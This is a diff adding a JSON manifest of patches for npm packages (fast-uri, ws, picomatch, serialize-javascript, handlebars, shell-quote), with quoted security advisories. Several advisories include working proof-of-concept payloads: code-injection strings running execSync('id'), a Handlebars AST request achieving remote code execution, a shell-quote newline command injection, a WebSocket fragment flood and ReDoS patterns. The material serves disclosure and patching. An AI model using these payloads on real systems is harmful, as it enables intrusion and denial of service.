@@ -1,0 +1,211 @@
+{
+  "patches": {
+    "pkg:npm/fast-uri@3.0.6": {
+      "uuid": "d4e48cf5-361c-49ba-a4a3-810f58bc94f6",
+      "exportedAt": "Thu, 30 Jul 2026 15:28:49 GMT",
+      "files": {
+        "index.js": {
+          "beforeHash": "ca68a28ad16c7f891f0096a7641a1bb9eb5d358e556b92f4e5bd316bd47f04e6",
+          "afterHash": "1ee52493c04ff9be2a83963c4e9e16d6177b125282ad073257a0eb489f39ad95"
+        },
+        "lib/utils.js": {
+          "beforeHash": "44421013e6d07c26c9e1f325eaa6b538c879dbe831628509b458ba115b3cc968",
+          "afterHash": "c756072b817fea82758e509c2f73802c5ff00ba9c2ba1701a65451adc68ea620"
+        }
+      },
+      "vulnerabilities": {
+        "GHSA-q3j6-qgpj-74h6": {
+          "cves": [
+            "CVE-2026-6321"
+          ],
+          "summary": "fast-uri vulnerable to path traversal via percent-encoded dot segments",
+          "severity": "HIGH",
+          "description": "### Impact\n\n`fast-uri` v3.1.0 and earlier decodes percent-encoded path separators (`%2F`) and dot segments (`%2E`) before applying dot-segment removal in `normalize()` and `equal()`. This makes encoded path data behave like real `/` and `..`, so distinct URIs collapse onto the same normalized path.\n\nFor example, `http://example.com/public/%2e%2e/admin` normalizes to `http://example.com/admin`, and `equal()` considers them the same URI.\n\nApplications that normalize or compare attacker-controlled URLs to enforce path-based policy can be bypassed. A path that looks confined under an allowed prefix can normalize to a different location.\n\n### Patches\n\nUpgrade to `fast-uri` >= 3.1.1, or if you are in the v2.x release line, v2.4.1\n\n### Workarounds\n\nNone. Upgrade to the patched version."
+        }
+      },
+      "description": "",
+      "license": "",
+      "tier": "free"
+    },
+    "pkg:npm/ws@8.18.2": {
+      "uuid": "15fc33c6-5540-488a-88e9-655837b163d5",
+      "exportedAt": "Fri, 07 Aug 2026 20:46:32 GMT",
+      "files": {
+        "lib/receiver.js": {
+          "beforeHash": "4c4aecb89c88e43e83b723a05e2452192da9905808b92a4d7f74370fef62ade3",
+          "afterHash": "e83cf44e42a91f583ab01fdc1a7d7bd6ab5ca2073a8a21ffac89434cfb4a0d88"
+        },
+        "lib/websocket-server.js": {
+          "beforeHash": "de63be2e139cd0fdf309f21d0f480f6973f950b8a35243e83a4260f9b29ba653",
+          "afterHash": "aa7187e56ed51b30bff560e4f799271f8522b4d8cd3295e74f456d0cbf311a34"
+        },
+        "lib/websocket.js": {
+          "beforeHash": "727890b2fd2fac0b279e2b846ba1501576ed421db10009bb66e5a2a2f3bf8c79",
+          "afterHash": "8758e6479aedc82bcce5f613144f8d7c46bcdc3bd38ac583180a18579be6645e"
+        }
+      },
+      "vulnerabilities": {
+        "GHSA-96hv-2xvq-fx4p": {
+          "cves": [
+            "CVE-2026-48779"
+          ],
+          "summary": "ws: Memory exhaustion DoS from tiny fragments and data chunks",
+          "severity": "HIGH",
+          "description": "### Impact\n\nA high volume of exceptionally small fragments and data chunks can be sent by a peer, with modest network traffic, to force the remote peer into allocating and holding structural wrappers that consume far more memory than the default documented message-size limit, leading to process termination due to OOM.\n\n### Proof of concept\n\n```js\nimport { WebSocket, WebSocketServer } from 'ws';\n\nconst wss = new WebSocketServer({ port: 0 }, function () {\n  const data = Buffer.alloc(1);\n  const options = { fin: false };\n  const { port } = wss.address();\n  const ws = new WebSocket(`ws://localhost:${port}`);\n\n  ws.on('open', function () {\n    (function send() {\n      ws.send(data, options, function (err) {\n        if (err) return;\n        send();\n      });\n    })();\n  });\n\n  ws.on('error', console.error);\n  ws.on('close', function (code, reason) {\n    console.log(`client close - code: ${code} reason: ${reason.toString()}`);\n  });\n});\n\nwss.on('connection', function (ws) {\n  ws.on('error', console.error);\n  ws.on('close', function (code, reason) {\n    console.log(`server close - code: ${code} reason: ${reason.toString()}`);\n  });\n});\n```\n\n### Patches\n\nThe vulnerability was fixed in ws@8.21.0 (https://github.com/websockets/ws/commit/bca91adf15677e47dbe4f959653452727be28b94) and backported to ws@7.5.11 (https://github.com/websockets/ws/commit/fd36cd864fcdf62a08273a99e19a7d975401fee8), ws@6.2.4 (https://github.com/websockets/ws/commit/86d3e8a5fb0246ed373860c5fbb0de88824a27f7), and ws@5.2.5 (https://github.com/websockets/ws/commit/b5372ac67bb97a773727b8e9f5035a8123556d53).\n\n### Workarounds\n\nIn vulnerable versions, the issue can be mitigated by lowering the value of the `maxPayload` option if possible.\n\n### Credits\n\nThe vulnerability was responsibly disclosed and fixed by [Nadav Magier](https://github.com/Nadav0077)."
+        }
+      },
+      "description": "",
+      "license": "",
+      "tier": "free"
+    },
+    "pkg:npm/picomatch@2.3.1": {
+      "uuid": "fea4a59a-d944-412c-84fe-612aa9522938",
+      "exportedAt": "Fri, 17 Jul 2026 20:00:33 GMT",
+      "files": {
+        "lib/constants.js": {
+          "beforeHash": "20210bdb41e7ca568f2aa75c082c8b2f87d8e2fbf87ec02fff120cf8a534503d",
+          "afterHash": "c44ef18d63927e946f9279158c4c4f3ced9e0d7f2fba01e27d20d37922a3a6c9"
+        },
+        "lib/parse.js": {
+          "beforeHash": "cbada698cc631ccd3b05c0e6d216536ca256b7f93987d053c38fa46129a07684",
+          "afterHash": "ecf879343a7d2ca0c3b1a97a7707db0f9613d8bea4c0dc8fdfa1b11cdfd6e197"
+        }
+      },
+      "vulnerabilities": {
+        "GHSA-c2c7-rcm5-vvqj": {
+          "cves": [
+            "CVE-2026-33671"
+          ],
+          "summary": "Picomatch has a ReDoS vulnerability via extglob quantifiers",
+          "severity": "HIGH",
+          "description": "### Impact\n`picomatch` is vulnerable to Regular Expression Denial of Service (ReDoS) when processing crafted extglob patterns. Certain patterns using extglob quantifiers such as `+()` and `*()`, especially when combined with overlapping alternatives or nested extglobs, are compiled into regular expressions that can exhibit catastrophic backtracking on non-matching input.\n\nExamples of problematic patterns include `+(a|aa)`, `+(*|?)`, `+(+(a))`, `*(+(a))`, and `+(+(+(a)))`. In local reproduction, these patterns caused multi-second event-loop blocking with relatively short inputs. For example, `+(a|aa)` compiled to `^(?:(?=.)(?:a|aa)+)$` and took about 2 seconds to reject a 41-character non-matching input, while nested patterns such as `+(+(a))` and `*(+(a))` took around 29 seconds to reject a 33-character input on a modern M1 MacBook.\n\nApplications are impacted when they allow untrusted users to supply glob patterns that are passed to `picomatch` for compilation or matching. In those cases, an attacker can cause excessive CPU consumption and block the Node.js event loop, resulting in a denial of service. Applications that only use trusted, developer-controlled glob patterns are much less likely to be exposed in a security-relevant way.\n\n### Patches\nThis issue is fixed in picomatch 4.0.4, 3.0.2 and 2.3.2.\n\nUsers should upgrade to one of these versions or later, depending on their supported release line.\n\n### Workarounds\nIf upgrading is not immediately possible, avoid passing untrusted glob patterns to `picomatch`.\n\nPossible mitigations include:\n- disable extglob support for untrusted patterns by using `noextglob: true`\n- reject or sanitize patterns containing nested extglobs or extglob quantifiers such as `+()` and `*()`\n- enforce strict allowlists for accepted pattern syntax\n- run matching in an isolated worker or separate process with time and resource limits\n- apply application-level request throttling and input validation for any endpoint that accepts glob patterns\n\n### Resources\n- Picomatch repository: https://github.com/micromatch/picomatch\n- `lib/parse.js` and `lib/constants.js` are involved in generating the vulnerable regex forms\n- Comparable ReDoS precedent: CVE-2024-4067 (`micromatch`)\n- Comparable generated-regex precedent: CVE-2024-45296 (`path-to-regexp`)"
+        }
+      },
+      "description": "",
+      "license": "",
+      "tier": "free"
+    },
+    "pkg:npm/picomatch@4.0.2": {
+      "uuid": "0bb6637a-1dc3-4e00-a948-0a8c6e1c9bff",
+      "exportedAt": "Fri, 17 Jul 2026 20:01:35 GMT",
+      "files": {
+        "lib/constants.js": {
+          "beforeHash": "033a1fa4d643ae11bbcfa8331094400a16c4d023b778f79572be63f0483b1279",
+          "afterHash": "b48172cc20801f32b0c73f7a6a2728faa1067ec09af3a8b244efe48b1f8c57c3"
+        },
+        "lib/parse.js": {
+          "beforeHash": "2f4c989a45e30c479d689b30802a1f6195ad76ebceb4990340bcefbd5e23dbcb",
+          "afterHash": "09a12252ef3edfdcfee6393a21704a6e70db101cafeb885091785987ece76c61"
+        }
+      },
+      "vulnerabilities": {
+        "GHSA-c2c7-rcm5-vvqj": {
+          "cves": [
+            "CVE-2026-33671"
+          ],
+          "summary": "Picomatch has a ReDoS vulnerability via extglob quantifiers",
+          "severity": "HIGH",
+          "description": "### Impact\n`picomatch` is vulnerable to Regular Expression Denial of Service (ReDoS) when processing crafted extglob patterns. Certain patterns using extglob quantifiers such as `+()` and `*()`, especially when combined with overlapping alternatives or nested extglobs, are compiled into regular expressions that can exhibit catastrophic backtracking on non-matching input.\n\nExamples of problematic patterns include `+(a|aa)`, `+(*|?)`, `+(+(a))`, `*(+(a))`, and `+(+(+(a)))`. In local reproduction, these patterns caused multi-second event-loop blocking with relatively short inputs. For example, `+(a|aa)` compiled to `^(?:(?=.)(?:a|aa)+)$` and took about 2 seconds to reject a 41-character non-matching input, while nested patterns such as `+(+(a))` and `*(+(a))` took around 29 seconds to reject a 33-character input on a modern M1 MacBook.\n\nApplications are impacted when they allow untrusted users to supply glob patterns that are passed to `picomatch` for compilation or matching. In those cases, an attacker can cause excessive CPU consumption and block the Node.js event loop, resulting in a denial of service. Applications that only use trusted, developer-controlled glob patterns are much less likely to be exposed in a security-relevant way.\n\n### Patches\nThis issue is fixed in picomatch 4.0.4, 3.0.2 and 2.3.2.\n\nUsers should upgrade to one of these versions or later, depending on their supported release line.\n\n### Workarounds\nIf upgrading is not immediately possible, avoid passing untrusted glob patterns to `picomatch`.\n\nPossible mitigations include:\n- disable extglob support for untrusted patterns by using `noextglob: true`\n- reject or sanitize patterns containing nested extglobs or extglob quantifiers such as `+()` and `*()`\n- enforce strict allowlists for accepted pattern syntax\n- run matching in an isolated worker or separate process with time and resource limits\n- apply application-level request throttling and input validation for any endpoint that accepts glob patterns\n\n### Resources\n- Picomatch repository: https://github.com/micromatch/picomatch\n- `lib/parse.js` and `lib/constants.js` are involved in generating the vulnerable regex forms\n- Comparable ReDoS precedent: CVE-2024-4067 (`micromatch`)\n- Comparable generated-regex precedent: CVE-2024-45296 (`path-to-regexp`)"
+        }
+      },
+      "description": "",
+      "license": "",
+      "tier": "free"
+    },
+    "pkg:npm/serialize-javascript@6.0.2": {
+      "uuid": "297b20b0-abd1-4377-ad96-ddb21c31fbd4",
+      "exportedAt": "Mon, 27 Jul 2026 21:53:26 GMT",
+      "files": {
+        "index.js": {
+          "beforeHash": "5e759421d6346fc01321ced6be01e42e89a722d28dd2e06becd75a307fc5cb10",
+          "afterHash": "2b8d0e59bf1b8a0f860cded1c239ae75e663981eb075f23f00475d56de78b5f9"
+        }
+      },
+      "vulnerabilities": {
+        "GHSA-5c6j-r48x-rmvq": {
+          "cves": [],
+          "summary": "Serialize JavaScript is Vulnerable to RCE via RegExp.flags and Date.prototype.toISOString()",
+          "severity": "HIGH",
+          "description": "### Impact\n\nThe serialize-javascript npm package (versions <= 7.0.2) contains a code injection vulnerability. It is an incomplete fix for CVE-2020-7660.\n\nWhile `RegExp.source` is sanitized, `RegExp.flags` is interpolated directly into the generated output without escaping. A similar issue exists in `Date.prototype.toISOString()`.\n\nIf an attacker can control the input object passed to `serialize()`, they can inject malicious JavaScript via the flags property of a RegExp object. When the serialized string is later evaluated (via `eval`, `new Function`, or `<script>` tags), the injected code executes.\n\n```javascript\nconst serialize = require('serialize-javascript');\n// Create an object that passes instanceof RegExp with a spoofed .flags\nconst fakeRegex = Object.create(RegExp.prototype);\nObject.defineProperty(fakeRegex, 'source', { get: () => 'x' });\nObject.defineProperty(fakeRegex, 'flags', {\n  get: () => '\"+(global.PWNED=\"CODE_INJECTION_VIA_FLAGS\")+\"'\n});\nfakeRegex.toJSON = function() { return '@placeholder'; };\nconst output = serialize({ re: fakeRegex });\n// Output: {\"re\":new RegExp(\"x\", \"\"+(global.PWNED=\"CODE_INJECTION_VIA_FLAGS\")+\"\")}\nlet obj;\neval('obj = ' + output);\nconsole.log(global.PWNED); // \"CODE_INJECTION_VIA_FLAGS\" — injected code executed!\n#h2. PoC 2: Code Injection via Date.toISOString()\n```\n\n```javascript\nconst serialize = require('serialize-javascript');\nconst fakeDate = Object.create(Date.prototype);\nfakeDate.toISOString = function() { return '\"+(global.DATE_PWNED=\"DATE_INJECTION\")+\"'; };\nfakeDate.toJSON = function() { return '2024-01-01'; };\nconst output = serialize({ d: fakeDate });\n// Output: {\"d\":new Date(\"\"+(global.DATE_PWNED=\"DATE_INJECTION\")+\"\")}\neval('obj = ' + output);\nconsole.log(global.DATE_PWNED); // \"DATE_INJECTION\" — injected code executed!\n#h2. PoC 3: Remote Code Execution\n```\n\n```javascript\nconst serialize = require('serialize-javascript');\nconst rceRegex = Object.create(RegExp.prototype);\nObject.defineProperty(rceRegex, 'source', { get: () => 'x' });\nObject.defineProperty(rceRegex, 'flags', {\n  get: () => '\"+require(\"child_process\").execSync(\"id\").toString()+\"'\n});\nrceRegex.toJSON = function() { return '@rce'; };\nconst output = serialize({ re: rceRegex });\n// Output: {\"re\":new RegExp(\"x\", \"\"+require(\"child_process\").execSync(\"id\").toString()+\"\")}\n// When eval'd on a Node.js server, executes the \"id\" system command\n```\n\n### Patches\n\nThe fix has been published in version 7.0.3. https://github.com/yahoo/serialize-javascript/releases/tag/v7.0.3"
+        }
+      },
+      "description": "",
+      "license": "",
+      "tier": "free"
+    },
+    "pkg:npm/handlebars@4.7.8": {
+      "uuid": "741aacbe-4f2d-44ce-bb6c-080c68ca0719",
+      "exportedAt": "Mon, 22 Jun 2026 23:36:07 GMT",
+      "files": {
+        "package/dist/amd/handlebars/compiler/base.js": {
+          "beforeHash": "5374d49cc49fd0a4d3bf1a188496de83c44928a0259d3ca22cd5d5a334ba15cb",
+          "afterHash": "fd956d4d10d711f0575cad38e09843aba5338c3d589eb05b3daf39c3fc3b9138"
+        },
+        "package/dist/amd/handlebars/compiler/compiler.js": {
+          "beforeHash": "b248f8c872d35b02a53a73779e87319b59b930a43abd25c7c79c1ee2ebdd5a36",
+          "afterHash": "27a6814436b8db51079e03cce00bf40094d949ce6604bdcbfec3a1c0a7305811"
+        },
+        "package/dist/cjs/handlebars/compiler/base.js": {
+          "beforeHash": "3d6cfb5722dbc9676d6ec57362cfec0872a218abf95ede0acbd9bee0f24a65cf",
+          "afterHash": "b756610dc08d09c4587239617cb723150fb7ddfe37d64564a49650a8372eadad"
+        },
+        "package/dist/cjs/handlebars/compiler/compiler.js": {
+          "beforeHash": "312118b817a5e53600d0fa2d9ab557a1f605ae32b565f14f96296631d39ed2de",
+          "afterHash": "6bdecb929b2498d49df4f0702418ad495a84bef551aa28ced61a3a3ff6baefab"
+        },
+        "package/dist/handlebars.amd.js": {
+          "beforeHash": "9a9a4d5157d012e020657196fc162d56aecb77aca4c9e0df46bfbb9370e19d8c",
+          "afterHash": "747da55ec3943f8e9523bbd10ce320c35c06347ca08b0d99116f736f8213de9d"
+        },
+        "package/dist/handlebars.js": {
+          "beforeHash": "9d78a6309c155c3bd804031f7abb195808d5524a06169134724b8ccac9c68b30",
+          "afterHash": "6697630baa9f06320c915e87955a284142bec7c78f0cee2d1b7f820210b78da6"
+        },
+        "package/lib/handlebars/compiler/base.js": {
+          "beforeHash": "e5bc614262e0df72777de3695a425a4f3ea2ad1e7cf7e5766764564f5782a5a2",
+          "afterHash": "3313c01bca068b1cf352cab89c9bb5547707a957f420f2be4fd399cd30bf1729"
+        },
+        "package/lib/handlebars/compiler/compiler.js": {
+          "beforeHash": "14af9707e960749b77ff187c57bfa6ccfb43668a4ae39885767e4804b3cc18af",
+          "afterHash": "3b3ddacf2c56e5c1f2b75bbb00d1d54dd9e69a9a0aad674c925dcc57fe603da4"
+        }
+      },
+      "vulnerabilities": {
+        "GHSA-2w6w-674q-4c4q": {
+          "cves": [
+            "CVE-2026-33937"
+          ],
+          "summary": "Handlebars.js has JavaScript Injection via AST Type Confusion",
+          "severity": "CRITICAL",
+          "description": "## Summary\n\n`Handlebars.compile()` accepts a pre-parsed AST object in addition to a template string. The `value` field of a `NumberLiteral` AST node is emitted directly into the generated JavaScript without quoting or sanitization. An attacker who can supply a crafted AST to `compile()` can therefore inject and execute arbitrary JavaScript, leading to Remote Code Execution on the server.\n\n## Description\n\n`Handlebars.compile()` accepts either a template string or a pre-parsed AST. When an AST is supplied, the JavaScript code generator in `lib/handlebars/compiler/javascript-compiler.js` emits `NumberLiteral` values verbatim:\n\n```javascript\n// Simplified representation of the vulnerable code path:\n// NumberLiteral.value is appended to the generated code without escaping\ncompiledCode += numberLiteralNode.value;\n```\n\nBecause the value is not wrapped in quotes or otherwise sanitized, passing a string such as `{},{})) + process.getBuiltinModule('child_process').execFileSync('id').toString() //` as the `value` of a `NumberLiteral` causes the generated `eval`-ed code to break out of its intended context and execute arbitrary commands.\n\nAny endpoint that deserializes user-controlled JSON and passes the result directly to `Handlebars.compile()` is exploitable.\n\n## Proof of Concept\n\nServer-side Express application that passes `req.body.text` to `Handlebars.compile()`:\n\n\n```Javascript\nimport express from \"express\";\nimport Handlebars from \"handlebars\";\n\nconst app = express();\napp.use(express.json());\n\napp.post(\"/api/render\", (req, res) => {\n  let text = req.body.text;\n  let template = Handlebars.compile(text);\n  let result = template();\n  res.send(result);\n});\n\napp.listen(2123);\n```\n\n```\nPOST /api/render HTTP/1.1\nContent-Type: application/json\nHost: 127.0.0.1:2123\n\n{\n  \"text\": {\n    \"type\": \"Program\",\n    \"body\": [\n      {\n        \"type\": \"MustacheStatement\",\n        \"path\": {\n          \"type\": \"PathExpression\",\n          \"data\": false,\n          \"depth\": 0,\n          \"parts\": [\"lookup\"],\n          \"original\": \"lookup\",\n          \"loc\": null\n        },\n        \"params\": [\n          {\n            \"type\": \"PathExpression\",\n            \"data\": false,\n            \"depth\": 0,\n            \"parts\": [],\n            \"original\": \"this\",\n            \"loc\": null\n          },\n          {\n            \"type\": \"NumberLiteral\",\n            \"value\": \"{},{})) + process.getBuiltinModule('child_process').execFileSync('id').toString() //\",\n            \"original\": 1,\n            \"loc\": null\n          }\n        ],\n        \"escaped\": true,\n        \"strip\": { \"open\": false, \"close\": false },\n        \"loc\": null\n      }\n    ]\n  }\n}\n```\n\nThe response body will contain the output of the `id` command executed on the server.\n\n## Workarounds\n\n- **Validate input type** before calling `Handlebars.compile()`: ensure the argument is always a  `string`, never a plain object or JSON-deserialized value.\n  ```javascript\n  if (typeof templateInput !== 'string') {\n    throw new TypeError('Template must be a string');\n  }\n  ```\n- Use the Handlebars **runtime-only** build (`handlebars/runtime`) on the server if templates are  pre-compiled at build time; `compile()` will be unavailable."
+        }
+      },
+      "description": "",
+      "license": "MIT",
+      "tier": "free"
+    },
+    "pkg:npm/shell-quote@1.8.3": {
+      "uuid": "7e947070-90ed-4a05-988b-19b2efa7e40f",
+      "exportedAt": "Thu, 23 Jul 2026 16:13:01 GMT",
+      "files": {
+        "quote.js": {
+          "beforeHash": "2d2f2a9cc9c6c6f8960bc45c90cb8d22ff878b1cf3a2ca249f22b2076acb5cd3",
+          "afterHash": "cf137993d06cc11c10400f7f9ecc469fae6050e41bf4d5ffd29ed8730b8e7532"
+        }
+      },
+      "vulnerabilities": {
+        "GHSA-w7jw-789q-3m8p": {
+          "cves": [
+            "CVE-2026-9277"
+          ],
+          "summary": "shell-quote quote() does not escape newlines in object .op values",
+          "severity": "CRITICAL",
+          "description": "### Summary\n\n`shell-quote`'s `quote()` function did not validate object-token inputs against the operator model used by `parse()`. The `.op` field was backslash-escaped character by character using `/(.)/g`, which in JavaScript does not match line terminators (`\\n`, `\\r`, U+2028, U+2029). A line terminator in `.op` therefore passed through unescaped into the output; POSIX shells treat a literal `\\n` as a command separator, so any content after it would execute as a second command.\n\nThe vulnerable code path is reachable in two ways. Neither requires the parser to misbehave — `parse()` only emits ops from a fixed control set — but both are documented API surface:\n\n1. **Direct construction.** A caller builds `{ op: '...\\n...' }` from external input (e.g. a deserialized argument array) and passes it to `quote()`.\n2. **`envFn` return.** `parse(cmd, envFn)` is documented to splice the return value of `envFn` into the result array when it is an object. An attacker-influenced data source consulted by `envFn` can introduce an object token whose `.op` reaches `quote()`.\n\n### Impact\n\nShell command injection in callers that pass object tokens with attacker-influenced `.op` values to `quote()` and then hand the result to a shell. The preconditions are narrower than ordinary string injection — they require the caller to feed object tokens into `quote()` — but object tokens are a public, documented part of the API surface, and `quote()` is intended to be a shell-safety boundary.\n\n### PoC\n\n```js\nconst { parse, quote } = require('shell-quote');\n\n// Direct construction\nquote([{ op: ';\\nid' }]);\n// → \"\\;\\n\\\\i\\\\d\"  ← literal newline; second line executes as a command\n\n// Via parse() with an envFn returning attacker-shaped objects\nconst tokens = parse('echo $X', () => ({ op: ';\\nid' }));\nrequire('child_process').execSync(quote(tokens), { shell: true });\n// Executes `id` after `echo \\;`.\n```\n\nConfirmed under `sh`, `bash`, `dash`, and `zsh`.\n\n### Patch\n\nFixed by replacing the per-character escape with strict shape validation in `quote()`. The object-token branch now:\n\n- **`{ op }`** — `.op` must be a string from the same allowlist the parser emits (`||`, `&&`, `;;`, `|&`, `<(`, `<<<`, `>>`, `>&`, `<&`, `&`, `;`, `(`, `)`, `|`, `<`, `>`). Anything else throws `TypeError`. This is the direct fix for the reported issue and removes the entire class of `.op` injection.\n- **`{ op: 'glob', pattern }`** — `.pattern` must be a string with no line terminators. Glob metacharacters (`*`, `?`, `[`, `]`, `{`, `}`, `,`) pass through; all other shell-special characters are backslash-escaped. (Previously the pattern field was discarded entirely and the literal string `\\g\\l\\o\\b` was emitted — a latent bug, not security-relevant.)\n- **`{ comment }`** — `.comment` must be a string with no line terminators (line terminators would end the shell comment and resume command parsing — same injection shape).\n- **Any other object shape** — `TypeError`.\n\nThe fix is allowlist-based rather than a targeted regex tweak, so it closes the reported vector and forecloses adjacent ones (U+2028 / U+2029 line separators in `.op`, line terminators in comments, unknown-shape objects coerced through `.replace`).\n\n### Workarounds\n\nPrior to upgrading, callers that build object tokens from untrusted input should validate `.op` against the parser's operator set themselves, and never construct `{ op }` from attacker-controlled strings.\n\n### Credits\n\nReported by Akshat Sinha"
+        }
+      },
+      "description": "",
+      "license": "",
+      "tier": "free"
+    }
+  }
+}
